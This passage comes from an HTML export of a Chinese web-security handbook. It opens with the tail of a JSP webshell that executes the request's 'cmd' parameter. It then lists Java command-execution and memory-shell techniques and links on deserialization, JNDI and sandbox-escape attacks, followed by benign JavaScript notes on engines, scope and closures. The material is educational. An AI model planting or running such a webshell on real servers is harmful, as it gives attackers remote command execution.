class="cm-keyword">super</span>.<span class="cm-variable">findClass</span>(<span class="cm-variable">name</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}.<span class="cm-variable">loadClass</span>(<span class="cm-string">"shell"</span>).<span class="cm-variable">getConstructor</span>(<span class="cm-variable-3">String</span>.<span class="cm-keyword">class</span>).<span class="cm-variable">newInstance</span>(<span class="cm-variable">request</span>.<span class="cm-variable">getParameter</span>(<span class="cm-string">"cmd"</span>)).<span class="cm-variable">toString</span>().<span class="cm-variable">getBytes</span>());</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">%&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 589px;"></div><div class="CodeMirror-gutters" style="height: 589px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p>&nbsp;</p><h4 id='执行命令变式'><span>执行命令变式</span></h4><ul><li><span>java.lang.ProcessBuilder#start</span></li><li><span>java.lang.Runtime#exec</span></li><li><span>TemplatesImpl</span></li></ul><h4 id='基于反射'><span>基于反射</span></h4><ul><li><span>class.forName</span></li><li><span>MethodAccessor.invoke</span></li><li><span>Method.invoke</span></li></ul><h4 id='其他-shell-变式'><span>其他 Shell 变式</span></h4><ul><li><span>java.beans.Expression</span></li><li><span>java.lang.ClassLoader</span></li><li><span>java.net.URLClassLoader</span></li><li><span>jdk.nashorn.internal.runtime.ScriptLoader</span></li><li><span>ObjectInputStream.resolveClass</span></li><li><span>ScriptEngine.eval</span></li><li><span>ScriptEngineManager</span></li><li><span>ToolProvider.getSystemJavaCompiler</span></li></ul><h4 id='tomcat-容器'><span>Tomcat 容器</span></h4><ul><li><span>Servlet</span></li><li><span>Filter</span></li><li><span>Listener</span></li></ul><h3 id='参考链接-6'><span>参考链接</span></h3><h4 id='官方文档-1'><span>官方文档</span></h4><ul><li><a href='http://commons.apache.org/proper/commons-ognl/'><span>ognl</span></a></li><li><a href='https://docs.oracle.com/javase/9/security/toc.htm'><span>Java SE Security Guide</span></a></li><li><a href='https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html'><span>Java RMI Release Notes for JDK 6</span></a></li><li><a href='https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html'><span>Java Release Notes for JDK 7</span></a></li></ul><h4 id='机制说明'><span>机制说明</span></h4><ul><li><a href='https://www.cnblogs.com/czwbig/p/11127222.html'><span>深入理解 Java 类加载</span></a></li></ul><h4 id='反序列化-7'><span>反序列化</span></h4><h5 id='标准'><span>标准</span></h5><ul><li><a href='https://blog.csdn.net/silentbalanceyh/article/details/8183849'><span>Java 序列化【草案一】</span></a></li><li><a href='https://docs.oracle.com/en/java/javase/14/docs/specs/serialization/index.html'><span>Java 14 Object Serialization Specification</span></a></li></ul><h5 id='利用与技巧'><span>利用与技巧</span></h5><ul><li><a href='https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles'><span>Marshalling Pickles how deserializing objects can ruin your day</span></a></li><li><a href='https://frohoff.github.io/appseccali-marshalling-pickles/'><span>AppSecCali 2015: Marshalling Pickles</span></a></li><li><a href='http://wouter.coekaerts.be/2015/annotationinvocationhandler'><span>More serialization hacks with AnnotationInvocationHandler</span></a></li><li><a href='https://github.com/pwntester/JRE8u20_RCE_Gadget'><span>Pure JRE 8 RCE Deserialization gadget</span></a></li><li><a href='http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html'><span>Breaking Defensive Serialization</span></a></li><li><a href='https://mp.weixin.qq.com/s/nNTw3HMnkX63d9ybdx3USQ'><span>Java 反序列化漏洞从入门到深入</span></a></li><li><a href='https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/'><span>Java 反序列化漏洞通用利用分析</span></a></li><li><a href='http://www.freebuf.com/vuls/176672.html'><span>JRE8u20 反序列化漏洞分析</span></a></li><li><a href='https://xz.aliyun.com/t/3847'><span>浅析 Java 序列化和反序列化</span></a></li><li><a href='https://security.tencent.com/index.php/blog/msg/97'><span>Commons Collections Java 反序列化漏洞深入分析</span></a></li><li><a href='https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf'><span>FAR SIDES OF JAVA REMOTE PROTOCOLS</span></a></li><li><a href='https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA'><span>JDK8u20 反序列化漏洞新型 PoC 思路及具体实现</span></a></li><li><a href='http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html'><span>Pwn a CTF Platform with Java JRMP Gadget</span></a></li><li><a href='https://nosec.org/home/detail/4846.html'><span>漫谈 JEP 290</span></a></li></ul><h5 id='框架-3'><span>框架</span></h5><ul><li><a href='https://www.freebuf.com/articles/web/169770.html'><span>WebLogic 反序列化漏洞漫谈</span></a></li><li><a href='https://cert.360.cn/report/detail?id=c8eed4b36fe8b19c585a1817b5f10b9e'><span>从 WebLogic 看反序列化漏洞的利用与防御</span></a></li><li><a href='https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf'><span>JSON 反序列化之殇</span></a></li><li><a href='https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg'><span>Shiro 组件漏洞与攻击链分析</span></a></li><li><a href='https://www.infoq.com/articles/apache-shiro/'><span>Application Security With Apache Shiro</span></a></li><li><a href='https://zhuanlan.zhihu.com/p/54176956'><span>Shiro 安全框架【快速入门】</span></a></li><li><a href='https://cloud.tencent.com/developer/article/1367702'><span>Shiro 实战 (四) - 过滤器机制</span></a></li></ul><h5 id='沙箱-4'><span>沙箱</span></h5><ul><li><a href='http://phrack.org/papers/escaping_the_java_sandbox.html'><span>Java Sandbox Escape</span></a></li></ul><h5 id='框架-4'><span>框架</span></h5><ul><li><a href='https://github.com/apache/struts'><span>Struts</span></a></li><li><a href='https://github.com/apache/struts-examples'><span>Struts Examples</span></a></li><li><a href='https://github.com/eclipse/jetty.project'><span>Eclipse Jetty</span></a></li><li><a href='https://github.com/LandGrey/SpringBootVulExploit'><span>SpringBootVulExploit</span></a><span> SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist</span></li></ul><h5 id='框架利用技巧'><span>框架利用技巧</span></h5><ul><li><a href='https://landgrey.me/blog/22/'><span>Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</span></a></li></ul><h4 id='rmi-2'><span>RMI</span></h4><ul><li><a href='https://www.cnblogs.com/ygj0930/p/6542811.html'><span>Java RMI 与 RPC 的区别</span></a></li><li><a href='https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html'><span>Remote Method Invocation (RMI)</span></a></li><li><a href='https://paper.seebug.org/1091'><span>Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿</span></a></li><li><a href='http://docs.oracle.com/cd/E11035_01/wls100/client/t3.html'><span>Oracle: Developing T3 Clients</span></a></li></ul><h4 id='jndi-2'><span>JNDI</span></h4><ul><li><a href='https://docs.oracle.com/javase/tutorial/jndi/overview/index.html'><span>Overview of JNDI</span></a></li><li><a href='https://paper.seebug.org/417/'><span>关于 JNDI 注入</span></a></li><li><a href='https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf'><span>A Journey From JNDI LDAP Manipulation To RCE</span></a></li><li><a href='https://www.freebuf.com/column/207439.html'><span>如何绕过高版本 JDK 的限制进行 JNDI 注入</span></a></li></ul><h4 id='webshell-4'><span>WebShell</span></h4><ul><li><a href='https://xz.aliyun.com/t/7798'><span>各种姿势 jsp webshell</span></a></li></ul><h4 id='其他漏洞'><span>其他漏洞</span></h4><ul><li><a href='http://blog.spoock.com/2018/10/23/java-xxe/index.html'><span>JAVA 常见的 XXE 漏洞写法和防御</span></a></li></ul><p>&nbsp;</p><h2 id='54-javascript'><span>5.4 JavaScript</span></h2><h3 id='ecmascript'><span>ECMAScript</span></h3><h4 id='简介-28'><span>简介</span></h4><blockquote><p><span>ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。</span></p></blockquote><h4 id='版本'><span>版本</span></h4><blockquote><p><span>1997 年 6 月，首版发布。</span></p><p><span>1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。</span></p><p><span>1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。</span></p><p><span>2009 年 12 月，第五版发布，新增</span>“<span>严格模式（strict mode）</span>”<span>，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。</span></p><p><span>2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps）， promise，reflection 和 proxies。</span></p><p><span>2016 年 6 月，ECMAScript 2016（ES2016）发布，引入 Array.prototype.includes 、指数运算符、SIMD等新特性。</span></p><p><span>2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。</span></p><p><span>2018 年 6 月，ECMAScript 2018（ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread语法。</span></p></blockquote><h4 id='es6-特性'><span>ES6 特性</span></h4><ul><li><p><span>const / let</span></p></li><li><p><span>模板字面量</span></p></li><li><h5 id='解构'><span>解构</span></h5><ul><li><span>[a, b</span><span>]</span><span> = </span><span>[</span><span>10, 20</span><span>]</span></li></ul></li><li><p><span>对象字面量简写法</span></p></li><li><p><span>for</span><span>.</span><span>..of 循环</span></p></li><li><p><span>.</span><span>..xxx 展开运算符</span></p></li><li><p><span>可变参数</span></p></li><li><p><span>箭头函数</span></p></li><li><p><span>默认参数函数</span></p></li><li><p><span>默认值与解构</span></p></li><li><p><span>类</span></p></li></ul><p>&nbsp;</p><h3 id='引擎'><span>引擎</span></h3><h4 id='v8'><span>V8</span></h4><blockquote><p><span>V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。</span></p></blockquote><h4 id='spidermonkey'><span>SpiderMonkey</span></h4><blockquote><p><span>SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。</span></p></blockquote><h4 id='javascriptcore'><span>JavaScriptCore</span></h4><blockquote><p><span>JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。</span></p></blockquote><h4 id='chakracore'><span>ChakraCore</span></h4><blockquote><p><span>ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。</span></p></blockquote><h4 id='jscript'><span>JScript</span></h4><blockquote><p><span>JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。</span></p></blockquote><h4 id='jerryscript'><span>JerryScript</span></h4><blockquote><p><span>JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。</span></p></blockquote><h3 id='webassembly-1'><span>WebAssembly</span></h3><h4 id='简介-29'><span>简介</span></h4><blockquote><p><span>简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。</span></p></blockquote><h4 id='执行'><span>执行</span></h4><blockquote><p><span>虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。</span></p><p><span>在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。</span></p><p><span>虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。</span></p><p><span>Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。</span></p></blockquote><h4 id='安全'><span>安全</span></h4><p><span>Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性：</span></p><ul><li><span>保护用户免受由于无意的错误而导致漏洞的应用程序的侵害</span></li><li><span>保护用户免受故意编写为恶意的应用程序的侵害</span></li><li><span>为开发人员提供良好的缓解措施</span></li></ul><p><span>具体的安全措施有：</span></p><ul><li><p><span>Wasm 应用程序在沙箱内运行</span></p></li><li><p><span>Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中</span></p></li><li><p><span>间接函数调用受类型签名检查的约束</span></p></li><li><p><span>调用堆栈受到保护，这意味着无法覆盖返回指针</span></p></li><li><p><span>实现了控制流完整性，这意味着调用意外的函数将失败</span></p><p>&nbsp;</p></li></ul><h3 id='作用域与闭包'><span>作用域与闭包</span></h3><h4 id='作用域与作用域链作用域'><span>作用域与作用域链作用域</span></h4><blockquote><p><span>简单来说， 作用域就是变量与函数的可访问范围， 即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。</span></p><p><span>作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：</span></p></blockquote><ul><li><span>函数外面定义的变量拥有全局作用域</span></li><li><span>未定义直接赋值的变量自动声明为拥有全局作用域</span></li><li><span>window 对象的属性拥有全局作用</span></li></ul><blockquote><p><span>局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。</span></p></blockquote><h4 id='作用域泄漏'><span>作用域泄漏</span></h4><p><span>在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：</span></p><blockquote><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>8</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">i</span><span class="cm-operator">=</span><span class="cm-number">1</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">f</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">i</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">if</span>(<span class="cm-atom">true</span>){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-keyword">var</span> <span class="cm-def">i</span><span class="cm-operator">=</span><span class="cm-number">2</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">f</span>();<span class="cm-comment">//undefined</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 181px;"></div><div class="CodeMirror-gutters" style="height: 181px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='作用域提升var-hoisting）'><span>作用域提升（var Hoisting）</span></h4><p><span>在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为Hoisting。例如下面这段代码等效于第二段代码：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>6</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">foo</span>(){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">x</span>); <span class="cm-comment">//=&gt;  undefined </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">var</span> <span class="cm-def">x</span><span class="cm-operator">=</span><span class="cm-number">1</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable-2">x</span>);<span class="cm-comment">//=&gt;1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">foo</span>();</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">foo</span>(){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">var</span> <span class="cm-def">x</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable-2">x</span>);<span class="cm-comment">//=&gt;undefined</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable-2">x</span><span class="cm-operator">=</span><span class="cm-number">1</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable-2">x</span>);<span class="cm-comment">//=&gt;1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">foo</span>();</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='作用域链'><span>作用域链</span></h4><p><span>当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为</span><strong><span>作用域链。</span></strong></p><h4 id='闭包'><span>闭包</span></h4><p><span>函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。</span></p><p><span>在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素/方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div 